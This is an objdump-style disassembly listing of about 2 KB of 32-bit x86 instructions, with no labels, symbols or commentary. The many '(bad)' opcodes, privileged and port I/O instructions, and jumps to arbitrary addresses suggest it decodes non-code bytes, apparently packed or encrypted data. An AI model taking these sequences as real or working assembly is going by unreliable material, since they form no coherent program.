  4120b0:	mov    eax,ds:0x3c4d79d6
  4120b5:	xchg   esi,eax
  4120b6:	into   
  4120b7:	jno    0x412039
  4120b9:	cmp    BYTE PTR [ecx+0x2ae7b6c1],ch
  4120bf:	arpl   dx,dx
  4120c1:	jne    0x41204e
  4120c3:	fldcw  WORD PTR ds:0x4a00e4f6
  4120c9:	jnp    0x4120eb
  4120cb:	or     edx,DWORD PTR [esi+0x51e06b29]
  4120d1:	mov    BYTE PTR [ebx+0x4629187c],bl
  4120d7:	fnstenv [ebx+0x553f7dd7]
  4120dd:	adc    DWORD PTR ds:0x76df312,edi
  4120e3:	je     0x4120e7
  4120e5:	or     ch,0xf7
  4120e8:	and    ecx,ecx
  4120ea:	mov    ah,0xe3
  4120ec:	mov    edx,0x70a4e79a
  4120f1:	int3   
  4120f2:	(bad)  
  4120f3:	or     esi,edi
  4120f5:	push   eax
  4120f6:	add    al,0x8f
  4120f8:	neg    DWORD PTR [esi-0x30e9f575]
  4120fe:	sub    ebx,DWORD PTR [ecx]
  412100:	or     al,0xa0
  412102:	push   ebp
  412103:	jne    0x4120c5
  412105:	dec    edi
  412106:	addr16 int 0x3b
  412109:	dec    edi
  41210a:	imul   BYTE PTR [eax]
  41210c:	retf   
  41210d:	add    eax,0x5713e0a2
  412112:	test   al,0x58
  412114:	les    ebx,FWORD PTR [ecx+0x3a]
  412117:	pop    ebx
  412118:	cdq    
  412119:	pop    esi
  41211a:	mov    ecx,0x929c8f78
  41211f:	int    0x67
  412121:	ins    DWORD PTR es:[edi],dx
  412122:	xchg   esp,eax
  412123:	scas   al,BYTE PTR es:[edi]
  412124:	pusha  
  412125:	jo     0x412180
  412127:	mov    eax,ds:0x879a7862
  41212c:	cmp    ebx,esp
  41212e:	popa   
  41212f:	sub    al,0xca
  412131:	cmp    BYTE PTR [ecx],al
  412133:	nop
  412134:	jecxz  0x412161
  412136:	in     al,dx
  412137:	sbb    ecx,DWORD PTR [ebx+ecx*8]
  41213a:	and    al,dh
  41213c:	scas   eax,DWORD PTR es:[edi]
  41213d:	nop
  41213e:	dec    ebx
  41213f:	aad    0xd1
  412141:	fiadd  WORD PTR [ebx]
  412143:	daa    
  412144:	jle    0x412170
  412146:	aaa    
  412147:	das    
  412148:	mov    ch,0x3f
  41214a:	pusha  
  41214b:	je     0x4120da
  41214d:	rcl    BYTE PTR [edx-0x20782801],0x40
  412154:	push   es
  412155:	aas    
  412156:	jns    0x412166
  412158:	push   0xffffff9e
  41215a:	je     0x412145
  41215c:	in     eax,0xf6
  41215e:	push   0x6d
  412160:	int    0xfd
  412162:	enter  0x80a3,0xae
  412166:	clc    
  412167:	retf   
  412168:	inc    edx
  412169:	add    al,0x68
  41216b:	pushf  
  41216c:	rcl    BYTE PTR [edx],cl
  41216e:	ja     0x412111
  412170:	fstp   TBYTE PTR [edi]
  412172:	adc    DWORD PTR [ebx],esp
  412174:	je     0x4121d5
  412176:	fisttp DWORD PTR [ecx-0x538fada7]
  41217c:	fldcw  WORD PTR [ebx-0x28c924c2]
  412182:	jns    0x412200
  412184:	test   DWORD PTR [ebp+0x5af3e0e6],eax
  41218a:	ss push edi
  41218c:	icebp  
  41218d:	clc    
  41218e:	and    al,0xe
  412190:	mov    al,ds:0xf2b92d60
  412195:	add    al,0x71
  412197:	xchg   ebp,eax
  412198:	mov    edx,ds
  41219a:	fst    DWORD PTR [ecx]
  41219c:	enter  0xb782,0x17
  4121a0:	lea    ecx,[edi+eiz*8]
  4121a3:	hlt    
  4121a4:	int3   
  4121a5:	and    cl,dh
  4121a7:	inc    edx
  4121a8:	test   al,0x3c
  4121aa:	inc    esi
  4121ab:	fldenv [ebp+0x22c4c7dc]
  4121b1:	cmp    esi,ebx
  4121b3:	or     eax,0x15e7a7ab
  4121b8:	fiadd  DWORD PTR gs:[ebx]
  4121bb:	pop    ecx
  4121bc:	add    DWORD PTR gs:[ebx-0x381c8ec4],0xabe5c31d
  4121c7:	xchg   esi,eax
  4121c8:	mov    eax,ds:0x6dacbe11
  4121cd:	lods   al,BYTE PTR ds:[esi]
  4121ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121cf:	bnd jo 0x41215e
  4121d2:	mov    ebx,0xae3766c1
  4121d7:	mov    dh,0x28
  4121d9:	pop    eax
  4121da:	rcl    DWORD PTR [eax-0x5c],1
  4121dd:	(bad)  
  4121de:	scas   al,BYTE PTR es:[edi]
  4121df:	mov    esi,0xdb553bc4
  4121e4:	sbb    eax,edi
  4121e6:	test   al,0x41
  4121e8:	in     eax,0x30
  4121ea:	or     dh,BYTE PTR [ecx+0x4372434b]
  4121f0:	retf   
  4121f1:	jno    0x41225d
  4121f3:	out    0x63,eax
  4121f5:	test   BYTE PTR [ecx+0x7a6f0af2],ch
  4121fb:	dec    ebx
  4121fc:	inc    esp
  4121fd:	mov    dl,0xbb
  4121ff:	cmp    DWORD PTR [ebx-0x1b],edx
  412202:	or     eax,0x788badcf
  412207:	mov    ds:0xf9bfad91,al
  41220c:	push   eax
  41220d:	cmp    al,al
  41220f:	aas    
  412210:	retf   
  412211:	jo     0x412260
  412213:	fbld   TBYTE PTR [edi-0xc]
  412216:	test   eax,edx
  412218:	sbb    eax,0x1859dd5f
  41221d:	jb     0x4121c5
  41221f:	mov    al,0xd5
  412221:	jmp    0x18832962
  412226:	je     0x412228
  412228:	pop    ss
  412229:	retf   0x9fd7
  41222c:	aad    0x52
  41222e:	push   0xed0b7d58
  412233:	jbe    0x4121ba
  412235:	pop    esi
  412236:	cmp    al,0x57
  412238:	aas    
  412239:	imul   BYTE PTR [ecx-0x7173e730]
  41223f:	adc    al,0x9e
  412241:	pop    ebp
  412242:	lds    ecx,FWORD PTR [esi+0x768b6907]
  412248:	pop    eax
  412249:	mov    ah,0x39
  41224b:	gs ret 
  41224d:	and    eax,0x901b10c4
  412252:	sub    al,0x6f
  412254:	jmp    0x41225f
  412256:	pop    edi
  412257:	push   esp
  412258:	pop    ecx
  412259:	retf   0xbde
  41225c:	mov    ch,0xab
  41225e:	pusha  
  41225f:	dec    edi
  412260:	pop    eax
  412261:	pop    esp
  412262:	(bad)  
  412263:	cmc    
  412264:	pminsw mm4,QWORD PTR [edx+0x33cf8f92]
  41226b:	push   ds
  41226c:	gs in  al,dx
  41226e:	adc    DWORD PTR [esp+ebp*1+0x59],0x2dff6bc9
  412276:	test   DWORD PTR [esi],esi
  412278:	fldenv [esi-0x5682841f]
  41227e:	dec    ebx
  41227f:	shr    DWORD PTR [ebx+0x3d2b03da],1
  412285:	push   ecx
  412286:	jo     0x412293
  412288:	push   0xda89f921
  41228d:	icebp  
  41228e:	pop    esi
  41228f:	or     BYTE PTR [ebx-0x2f],bl
  412292:	add    BYTE PTR [eax+0xd],dl
  412295:	add    esp,DWORD PTR [ebp+0x1a2c49b8]
  41229b:	mov    al,0xc9
  41229d:	es cs popa 
  4122a0:	mov    fs,WORD PTR [edi+0x5b67e80f]
  4122a6:	adc    DWORD PTR [ebx+eiz*8],eax
  4122a9:	add    DWORD PTR [edi-0x22],0xb2a89f3
  4122b0:	out    0x36,al
  4122b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4122b3:	rcl    BYTE PTR [eax+0x312cf8d8],1
  4122b9:	shl    BYTE PTR [ecx+0x67],1
  4122bc:	scas   al,BYTE PTR es:[edi]
  4122bd:	pop    ds
  4122be:	jl     0x412292
  4122c0:	dec    ebp
  4122c1:	lahf   
  4122c2:	sub    dh,cl
  4122c4:	jnp    0x412326
  4122c6:	mov    ecx,0x4ed61cac
  4122cb:	fld    DWORD PTR [eax-0x70390cd3]
  4122d1:	jo     0x4122f1
  4122d3:	in     al,0x57
  4122d5:	push   ds
  4122d6:	adc    BYTE PTR [edx],bh
  4122d8:	imul   esp,DWORD PTR [eax-0x3c467952],0xffffffc7
  4122df:	dec    edx
  4122e0:	mov    ebp,DWORD PTR [ecx]
  4122e2:	fwait
  4122e3:	xor    DWORD PTR [edi+0x42],ecx
  4122e6:	int    0xf0
  4122e8:	sti    
  4122e9:	shl    edi,0x8b
  4122ec:	add    esi,DWORD PTR [ebx+0x63]
  4122ef:	outs   dx,DWORD PTR ds:[esi]
  4122f0:	ja     0x4122a3
  4122f2:	adc    eax,0xb4566051
  4122f7:	push   eax
  4122f8:	in     al,0xf4
  4122fa:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  4122fc:	mov    ah,0x84
  4122fe:	out    dx,al
  4122ff:	pop    ebx
  412300:	out    dx,eax
  412301:	mov    dh,0x87
  412303:	popf   
  412304:	addr16 retf 0x41db
  412308:	lds    edx,FWORD PTR [esi]
  41230a:	add    al,0x9a
  41230c:	xor    ah,0x50
  41230f:	adc    edi,edx
  412311:	repnz add eax,0x4b5df0ad
  412317:	ss sti 
  412319:	cmp    esp,DWORD PTR [eax-0x412e7c79]
  41231f:	inc    eax
  412320:	push   ss
  412321:	add    BYTE PTR [eax],dl
  412323:	jnp    0x412383
  412325:	ss xor bl,ah
  412328:	iret   
  412329:	fdivr  DWORD PTR [ebx+0x67f282bc]
  41232f:	js     0x4122eb
  412331:	(bad)  
  412332:	sahf   
  412333:	aam    0xcc
  412335:	jp     0x4122bd
  412337:	js     0x412364
  412339:	ins    DWORD PTR es:[edi],dx
  41233a:	pop    edi
  41233b:	or     DWORD PTR [edi-0x5b],eax
  41233e:	mov    ecx,0xc0559be0
  412343:	jge    0x412393
  412345:	lds    eax,FWORD PTR [eax-0x78990970]
  41234b:	out    0x13,eax
  41234d:	mov    eax,0xb05f1e8c
  412352:	and    DWORD PTR [eax+0x138161e0],ebp
  412358:	jmp    0x41237c
  41235a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41235b:	jle    0x4123cd
  41235d:	call   0x7c5:0x7d45e188
  412364:	ror    DWORD PTR [edi+eax*4+0x7ed0287d],1
  41236b:	pop    esp
  41236c:	lds    edx,FWORD PTR ds:0x7b98f8a7
  412372:	jmp    0x81d90c1
  412377:	test   esi,esp
  412379:	inc    edi
  41237a:	addr16 in al,dx
  41237c:	add    ebx,DWORD PTR [edx]
  41237e:	mov    ebx,0x48e64fdb
  412383:	mov    BYTE PTR cs:[eax+0x43313801],bl
  41238a:	mov    al,ds:0xbed5bf62
  41238f:	sbb    al,0xda
  412391:	daa    
  412392:	dec    ebx
  412393:	nop
  412394:	ficomp WORD PTR [ebx]
  412396:	cmp    eax,0xcb510953
  41239b:	dec    ebx
  41239c:	sahf   
  41239d:	pop    edx
  41239e:	(bad)
  4123a2:	dec    edx
  4123a3:	and    DWORD PTR [edx+0x3c358b6b],eax
  4123a9:	int3   
  4123aa:	cmp    eax,0x6137a7ef
  4123af:	pop    edi
  4123b0:	jecxz  0x4123dd
  4123b2:	push   edi
  4123b3:	dec    ebx
  4123b4:	jecxz  0x412366
  4123b6:	das    
  4123b7:	xor    DWORD PTR [eax-0x24],ebx
  4123ba:	adc    al,0xa5
  4123bc:	dec    esp
  4123bd:	aas    
  4123be:	adc    eax,DWORD PTR [edi+0x1]
  4123c1:	enter  0x30f3,0x3c
  4123c5:	push   edx
  4123c6:	rcr    ch,cl
  4123c8:	and    BYTE PTR [edi],cl
  4123ca:	and    DWORD PTR [edx+0x51e6da16],0xfb1d0b3d
  4123d4:	lea    eax,ds:0x499eea37
  4123da:	jp     0x4123f8
  4123dc:	mov    dl,0xe3
  4123de:	test   DWORD PTR [esp+ebx*1],esi
  4123e1:	hlt    
  4123e2:	xlat   BYTE PTR ds:[ebx]
  4123e3:	inc    esp
  4123e4:	mov    bh,0x0
  4123e6:	xchg   ebp,eax
  4123e7:	lods   eax,DWORD PTR ds:[esi]
  4123e8:	adc    eax,0x92002901
  4123ed:	xchg   esp,eax
  4123ee:	dec    ebx
  4123ef:	pop    ebp
  4123f0:	mov    esp,0xb587d76e
  4123f5:	sub    bl,dh
  4123f7:	push   0x8276fc0f
  4123fc:	sub    ecx,DWORD PTR [edi+0x2cba789b]
  412402:	outs   dx,BYTE PTR ds:[esi]
  412403:	xchg   DWORD PTR [edx+0x4a14e6f6],esp
  412409:	or     al,0xbf
  41240b:	xchg   ebp,eax
  41240c:	fisttp WORD PTR [eax+0x45]
  41240f:	adc    eax,0xc6a0c125
  412414:	clc    
  412415:	cmp    al,0x40
  412417:	addr16 add dh,0x49
  41241b:	push   0xa8215836
  412420:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412421:	lock ins BYTE PTR es:[edi],dx
  412423:	or     bh,dh
  412425:	std    
  412426:	aas    
  412427:	ss hlt 
  412429:	cld    
  41242a:	jae    0x4123ec
  41242c:	call   0xbfae2a28
  412431:	add    ah,0x8
  412434:	nop
  412435:	loopne 0x4124b4
  412437:	jle    0x412406
  412439:	cmc    
  41243a:	push   ss
  41243b:	aam    0xa1
  41243d:	aas    
  41243e:	xchg   DWORD PTR [eax+0x7b],ebx
  412441:	scas   eax,DWORD PTR es:[edi]
  412442:	cmp    DWORD PTR [ebx],0xffffffc3
  412445:	and    ecx,DWORD PTR [ecx]
  412447:	test   eax,0xdf636a9b
  41244c:	push   esi
  41244d:	repz push esi
  41244f:	fcomp  DWORD PTR [edx+esi*2+0x31]
  412453:	out    dx,eax
  412454:	jg     0x41242f
  412456:	dec    edx
  412457:	(bad)  
  412458:	pop    edx
  412459:	inc    ebx
  41245a:	mov    dh,0xf1
  41245c:	shl    BYTE PTR [edx],1
  41245e:	ret    
  41245f:	retf   
  412460:	inc    ecx
  412461:	not    dl
  412463:	fwait
  412464:	inc    edx
  412465:	mov    al,ds:0xc315b8c6
  41246a:	loop   0x412418
  41246c:	push   ebp
  41246d:	mov    eax,ds:0xe7bafba7
  412472:	xor    ebx,ecx
  412474:	xchg   edx,eax
  412475:	fldcw  WORD PTR [edx-0x28]
  412478:	out    dx,eax
  412479:	xchg   ecx,eax
  41247a:	(bad)  
  41247b:	xchg   edi,eax
  41247c:	mov    esi,DWORD PTR [ebx]
  41247e:	retf   
  41247f:	clc    
  412480:	jns    0x412471
  412482:	push   ebx
  412483:	sbb    eax,0x397e4894
  412488:	loope  0x41245e
  41248a:	dec    esp
  41248b:	jo     0x41243c
  41248d:	aad    0x33
  41248f:	cmp    ecx,DWORD PTR [edx]
  412491:	retf   
  412492:	push   eax
  412493:	test   DWORD PTR [edi-0x57],ebp
  412496:	jns    0x41245f
  412498:	enter  0xc745,0xa0
  41249c:	(bad)  
  41249e:	arpl   WORD PTR [ebx-0x48],sp
  4124a1:	push   ss
  4124a2:	inc    edi
  4124a3:	icebp  
  4124a4:	xchg   ebx,eax
  4124a5:	adc    eax,edx
  4124a7:	mov    ecx,0xebdca9cd
  4124ac:	lahf   
  4124ad:	and    esi,eax
  4124af:	inc    ebp
  4124b0:	fadd   st,st(7)
  4124b2:	repnz sbb DWORD PTR [eax],0xffffff9a
  4124b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4124b7:	or     eax,0xf4388478
  4124bc:	xchg   esi,eax
  4124bd:	jo     0x4124be
  4124bf:	push   0x6c
  4124c1:	pop    edx
  4124c2:	rcl    BYTE PTR [eax+0x31],0x1b
  4124c6:	out    dx,al
  4124c7:	cmp    ebp,DWORD PTR [edi-0x51]
  4124ca:	(bad)  
  4124cb:	into   
  4124cc:	jmp    0x41250a
  4124ce:	mov    ch,0xbb
  4124d0:	sbb    cx,di
  4124d3:	hlt    
  4124d4:	inc    eax
  4124d5:	dec    esp
  4124d6:	sub    ebp,ebx
  4124d8:	dec    ecx
  4124d9:	mov    al,0xc
  4124db:	pop    esp
  4124dc:	icebp  
  4124dd:	pop    edi
  4124de:	jg     0x41248a
  4124e0:	(bad)  
  4124e1:	icebp  
  4124e2:	(bad)  
  4124e3:	jnp    0x41250b
  4124e5:	cmc    
  4124e6:	dec    ebx
  4124e7:	loopne 0x412551
  4124e9:	mov    eax,ds:0x9f79b2b3
  4124ee:	rol    edx,1
  4124f0:	pop    edi
  4124f1:	mov    al,ds:0x1c2e0ed2
  4124f6:	dec    edi
  4124f7:	lahf   
  4124f8:	nop
  4124f9:	je     0x412499
  4124fb:	ja     0x4124e6
  4124fd:	leave  
  4124fe:	mov    DWORD PTR [eax+edi*1],eax
  412501:	dec    edi
  412502:	or     eax,0x833eefd5
  412507:	push   ss
  412508:	test   al,0x4f
  41250a:	mov    ch,0x7a
  41250c:	xchg   edi,eax
  41250d:	xor    ebp,DWORD PTR [edi-0x764be5b0]
  412513:	stos   BYTE PTR es:[edi],al
  412514:	int3   
  412515:	scas   eax,DWORD PTR es:[edi]
  412516:	pop    edx
  412517:	shl    DWORD PTR [ebp+0x5313691f],1
  41251d:	loop   0x41255b
  41251f:	outs   dx,DWORD PTR ds:[esi]
  412520:	mov    BYTE PTR [edx+0x5690c1d],bl
  412526:	sbb    bh,BYTE PTR [eax]
  412528:	enter  0x4d38,0xef
  41252c:	xchg   BYTE PTR [eax+0x54],dl
  41252f:	pushf  
  412530:	push   0x8a28ddc5
  412535:	pop    esp
  412536:	jle    0x4124ec
  412538:	aam    0xab
  41253a:	push   esi
  41253b:	icebp  
  41253c:	add    al,0x18
  41253e:	ds xchg ebp,eax
  412540:	jns    0x4125b5
  412542:	push   ebp
  412543:	mov    bh,0x35
  412545:	out    dx,eax
  412546:	fadd   DWORD PTR [eax-0x71]
  412549:	call   0xed07:0x71d9d93b
  412550:	popa   
  412551:	out    0x1f,al
  412553:	mov    ds:0xb9d74ccb,al
  412558:	mov    ebx,0x3d72c765
  41255d:	shl    BYTE PTR [ecx-0x49],0x6a
  412561:	(bad)  
  412562:	jmp    0x412592
  412564:	iret   
  412565:	scas   al,BYTE PTR es:[edi]
  412566:	xchg   ebx,eax
  412567:	add    edi,esp
  412569:	lods   eax,DWORD PTR ds:[esi]
  41256a:	imul   eax,DWORD PTR [ebx-0x2d05b1e0],0xffffff8e
  412571:	aas    
  412572:	add    dl,cl
  412574:	jne    0x412562
  412576:	ror    bl,cl
  412578:	xor    eax,0x7df78d35
  41257d:	out    0xd7,eax
  41257f:	mov    ebx,edx
  412581:	fsub   DWORD PTR [esi]
  412583:	dec    eax
  412584:	and    al,al
  412586:	stos   DWORD PTR es:[edi],eax
  412587:	pusha  
  412588:	mov    al,ds:0x6d1ddaa7
  41258d:	aaa    
  41258e:	es add al,0x9
  412591:	xor    BYTE PTR [eax],dh
  412593:	adc    al,0xea
  412595:	aam    0xf2
  412597:	mov    ah,0xba
  412599:	sub    DWORD PTR [ebx-0x41],esi
  41259c:	mov    DWORD PTR [esp+ebx*1-0x607a106b],ebx
  4125a3:	mov    ?,WORD PTR [ebx+0x47a6f768]
  4125a9:	mov    al,ds:0x8c68bc36
  4125ae:	loope  0x412598
  4125b0:	xor    dl,bh
  4125b2:	cmp    al,0x7f
  4125b4:	lds    ebx,FWORD PTR [edx]
  4125b6:	push   eax
  4125b7:	jg     0x4125da
  4125b9:	cwde   
  4125ba:	mov    WORD PTR [edx+0x37af06e3],fs
  4125c0:	les    esp,FWORD PTR [eax+0x487faabc]
  4125c6:	fcom   st(4)
  4125c8:	shr    bh,cl
  4125ca:	cmp    BYTE PTR [edx+edi*1-0xddcb9cb],al
  4125d1:	imul   ecx,DWORD PTR [ebx-0x2aa10b1a],0xffffff9b
  4125d8:	mov    dl,0xee
  4125da:	add    al,0xfa
  4125dc:	aad    0x97
  4125de:	and    eax,0x9531b9ef
  4125e3:	icebp  
  4125e4:	(bad)  
  4125e5:	in     al,0xb8
  4125e7:	stos   DWORD PTR es:[edi],eax
  4125e8:	xchg   ecx,eax
  4125e9:	sbb    DWORD PTR [edi+0x1d946df1],0x2d
  4125f0:	aad    0x33
  4125f2:	sub    ebx,DWORD PTR [ebp+ecx*4+0x30dca3c6]
  4125f9:	and    esp,DWORD PTR [eax+edi*4]
  4125fc:	fs out 0x6d,al
  4125ff:	les    ebp,FWORD PTR [esi+0x5d2f4aa0]
  412605:	push   esp
  412606:	and    eax,0x67d63ff4
  41260b:	dec    esi
  41260c:	jae    0x412685
  41260e:	jge    0x4125cd
  412610:	xor    al,0x7a
  412612:	icebp  
  412613:	jae    0x4125fb
  412615:	sti    
  412616:	xsha1  (bad)
  412617:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412618:	dec    esp
  412619:	push   ds
  41261a:	cmc    
  41261b:	dec    esp
  41261c:	jmp    0x4125f4
  41261e:	push   esp
  41261f:	repz icebp 
  412621:	push   ss
  412622:	push   cs
  412623:	inc    edi
  412624:	bound  edi,QWORD PTR [eax-0x1645e2fc]
  41262a:	xlat   BYTE PTR ds:[ebx]
  41262b:	stos   DWORD PTR es:[edi],eax
  41262c:	pop    ebp
  41262d:	mov    al,0x52
  41262f:	inc    esp
  412630:	jge    0x4125cb
  412632:	and    al,0x57
  412634:	mov    ebp,0x8c216ff7
  412639:	mov    eax,ds:0x25fbcfc3
  41263e:	xchg   DWORD PTR [esp+ebx*2],ebx
  412641:	pop    edx
  412642:	arpl   WORD PTR [esi+ebp*8+0x37ffd095],ax
  412649:	adc    al,0x74
  41264b:	xchg   esi,eax
  41264c:	vshufpd ymm5,ymm7,YMMWORD PTR [ecx],0x2a
  412651:	dec    eax
  412652:	aas    
  412653:	cmp    DWORD PTR [ecx+eiz*4],ebp
  412656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412657:	or     DWORD PTR [edi+0x57],edx
  41265a:	mul    eax
  41265c:	imul   ecx,DWORD PTR [ebx-0x21],0x29c0c919
  412663:	repz mov ah,0xcb
  412666:	xchg   DWORD PTR [ecx],edi
  412668:	leave  
  412669:	inc    esp
  41266a:	or     BYTE PTR [ebp+0x580f2144],ch
  412670:	and    BYTE PTR ds:0x70dd9574,cl
  412676:	test   BYTE PTR [edi],al
  412678:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412679:	enter  0x4cc7,0x97
  41267d:	aad    0xe
  41267f:	dec    ecx
  412680:	(bad)  
  412682:	in     eax,0x19
  412684:	xor    dl,BYTE PTR [esi+0x21]
  412687:	jne    0x41265b
  412689:	mov    cl,0xde
  41268b:	sar    edx,cl
  41268d:	in     al,0x55
  41268f:	call   0x6b587a76
  412694:	shr    ebx,cl
  412696:	push   esp
  412697:	fld    TBYTE PTR [ecx+edi*2+0x51]
  41269b:	rcl    DWORD PTR [ebx-0x4aac14d2],0xe3
  4126a2:	mov    eax,0x66f3f527
  4126a7:	test   al,0x8c
  4126a9:	bnd jno 0x412724
  4126ac:	daa    
  4126ad:	mov    ebx,0x7fbea0e8
  4126b2:	cdq    
  4126b3:	mov    al,0x27
  4126b5:	test   esp,esp
  4126b7:	dec    eax
  4126b8:	test   DWORD PTR [edi-0x5a],edi
  4126bb:	imul   ebp,DWORD PTR [eax-0x34],0x6a
  4126bf:	aam    0x2f
  4126c1:	adc    BYTE PTR [ebx-0x66129efa],bh
  4126c7:	adc    BYTE PTR [esi],0xe5
  4126ca:	inc    ebp
  4126cb:	clc    
  4126cc:	clc    
  4126cd:	arpl   WORD PTR [eax],sp
  4126cf:	sub    ch,bh
  4126d1:	rcr    BYTE PTR [edi+0x329fe79],0xef
  4126d8:	or     DWORD PTR [ebx+edi*8+0x3253a598],0xf4511bf0
  4126e3:	pop    ss
  4126e4:	ror    ebp,1
  4126e6:	mov    ah,0x2
  4126e8:	std    
  4126e9:	jmp    0x4126d3
  4126eb:	cmp    eax,0x655e23c9
  4126f0:	push   ebx
  4126f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4126f2:	xor    DWORD PTR [ebx],0x53
  4126f5:	xor    DWORD PTR [ebp-0x6f],ecx
  4126f8:	retf   0x8cc7
  4126fb:	(bad)
  4126fe:	ror    BYTE PTR [ecx+ecx*2-0x5f],1
  412702:	fdivr  QWORD PTR [edx]
  412704:	dec    esi
  412705:	xchg   edi,eax
  412706:	add    BYTE PTR [edi-0x9],cl
  412709:	shr    dl,0x8d
  41270c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41270d:	dec    edi
  41270e:	div    BYTE PTR [esi-0x6c48a86f]
  412714:	inc    esp
  412715:	xchg   esp,eax
  412716:	sahf   
  412717:	sbb    bl,BYTE PTR [eax+0x2f260af0]
  41271d:	out    0xf6,al
  41271f:	cs mov edi,0xdf77ca96
  412725:	adc    ch,BYTE PTR [ebx-0x5d]
  412728:	loopne 0x41279f
  41272a:	dec    esp
  41272b:	(bad)  
  41272c:	out    0x76,eax
  41272e:	aam    0xf3
  412730:	xor    eax,0x83975850
  412735:	add    ebx,edx
  412737:	ds xchg ebx,eax
  412739:	mov    WORD PTR [eax+eiz*4-0x21],?
  41273d:	push   ecx
  41273e:	sbb    al,BYTE PTR [ebp-0x79929e27]
  412744:	pop    edx
  412745:	lods   al,BYTE PTR ds:[esi]
  412746:	add    ebp,DWORD PTR [ebp-0x77]
  412749:	call   0xa649:0x3bd631cb
  412750:	jg     0x412738
  412752:	fcom   DWORD PTR [ebp-0x5b]
  412755:	jmp    0x3ae7e452
  41275a:	dec    ebx
  41275b:	std    
  41275c:	xlat   BYTE PTR ds:[ebx]
  41275d:	push   0xb19ff869
  412762:	es push 0xa6addd14
  412768:	ret    0xa73c
  41276b:	enter  0x4465,0xe9
  41276f:	cmp    esp,0xb2bf03f4
  412775:	xor    DWORD PTR [ebx],0xaec8778d
  41277b:	(bad)
  41277f:	(bad)  
  412780:	sub    eax,0xebe6a006
  412785:	loope  0x4127b3
  412787:	jnp    0x412790
  412789:	add    ch,ah
  41278b:	loopne 0x4127cc
  41278d:	sar    ecx,cl
  41278f:	xor    BYTE PTR [esi],ch
  412791:	test   DWORD PTR [ecx+0xe02f18d],ecx
  412797:	clc    
  412798:	in     al,0x7c
  41279a:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  41279c:	inc    edx
  41279d:	jne    0x41274d
  41279f:	push   esi
  4127a0:	loope  0x4127e6
  4127a2:	fmulp  st(3),st
  4127a4:	push   0x3ce2f936
  4127a9:	jmp    0xd2f28a19
  4127ae:	mov    edx,0x4f769a7f
  4127b3:	test   DWORD PTR [edx],esi
  4127b5:	popa   
  4127b6:	shl    BYTE PTR [edi-0x73],cl
  4127b9:	add    eax,0x504d68
  4127be:	inc    ecx
  4127bf:	imul   eax,DWORD PTR [ebx],0xffffff86
  4127c2:	mov    eax,0x91296029
  4127c7:	add    DWORD PTR [edx-0x77],ebp
  4127ca:	sti    
  4127cb:	cmp    edx,DWORD PTR [ebx]
  4127cd:	fmulp  st(7),st
  4127cf:	dec    esp
  4127d0:	jne    0x41284f
  4127d2:	adc    al,0xa5
  4127d4:	fwait
  4127d5:	std    
  4127d6:	adc    dh,dl
  4127d8:	ds (bad) 
  4127da:	into   
  4127db:	es out dx,eax
  4127dd:	add    eax,0x5aaec73e
  4127e2:	adc    ah,BYTE PTR [ebx]
  4127e4:	mov    ecx,DWORD PTR [edi+0x2d]
  4127e7:	mov    cl,BYTE PTR [edi+eax*8-0xd]
  4127eb:	out    0x9d,al
  4127ed:	xlat   BYTE PTR ds:[ebx]
  4127ee:	lds    esp,FWORD PTR [esp+esi*8]
  4127f1:	ficomp WORD PTR ds:0x24e5d3dd
  4127f7:	push   edi
  4127f8:	cmp    eax,DWORD PTR [eax+0x70]
  4127fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127fc:	je     0x4127b1
  4127fe:	lods   al,BYTE PTR ds:[esi]
  4127ff:	ret    0x950d
  412802:	cmp    DWORD PTR [esi+0x140b2715],esi
  412808:	out    0x15,eax
  41280a:	and    eax,0xea7b3f7d
  41280f:	loop   0x412841
  412811:	out    0xf6,al
  412813:	jp     0x412832
  412815:	add    BYTE PTR ds:0x23359895,dl
  41281b:	daa    
  41281c:	(bad)  
  41281d:	cdq    
  41281e:	scas   eax,DWORD PTR es:[edi]
  41281f:	add    esi,DWORD PTR [edx-0x688fc355]
  412825:	dec    eax
  412826:	ret    
  412827:	jo     0x412894
  412829:	pop    ds
  41282a:	nop
  41282b:	mov    ch,0x43
  41282d:	push   es
  41282e:	sbb    eax,0x1a6ec415
  412833:	stc    
  412834:	icebp  
  412835:	outs   dx,DWORD PTR ds:[esi]
  412836:	mov    cl,0x2a
  412838:	ret    
  412839:	pop    ss
  41283a:	lea    ebp,[ebp+0x3f]
  41283d:	outs   dx,BYTE PTR ds:[esi]
  41283e:	push   si
  412840:	lods   eax,DWORD PTR ds:[esi]
  412841:	xor    edi,0x0
  412844:	or     bl,BYTE PTR [ebp+0xf8b1ddb]
  41284a:	shr    eax,cl
  41284c:	and    edi,DWORD PTR ds:0x52792162
  412852:	and    DWORD PTR [eax-0x44],ecx
  412855:	aas    
  412856:	rcl    eax,0x52
  412859:	nop
  41285a:	test   DWORD PTR [esi],ebx
  41285c:	xchg   ebp,eax
  41285d:	push   cs
  41285e:	add    ax,0x718f
  412862:	pop    esi
  412863:	dec    ebx
  412864:	sub    ebp,DWORD PTR [esp+esi*8-0x25]
  412868:	mov    ch,0xba
  41286a:	(bad)  
  41286b:	in     al,0x83
  41286d:	mov    esi,DWORD PTR [eax+eiz*1]
  412870:	scas   al,BYTE PTR es:[edi]
  412871:	(bad)  
  412872:	fiadd  DWORD PTR [edi]
  412874:	xor    al,0xdf
  412876:	mov    esp,0x601049d6
  41287b:	lds    esp,FWORD PTR [esi+0x66a3426c]
  412881:	mov    gs,WORD PTR [edi-0x22]
  412884:	aaa    
  412885:	aaa    
  412886:	and    DWORD PTR [ebx+0xe17c400],ebx
  41288c:	ror    DWORD PTR [ebp+eiz*4+0x26],0x49
  412891:	sub    al,0xf8
  412893:	aas    
  412894:	stc    
  412895:	pop    ds
  412896:	jne    0x4128a1
  412898:	aas    
  412899:	inc    esi
  41289a:	stos   DWORD PTR es:[edi],eax
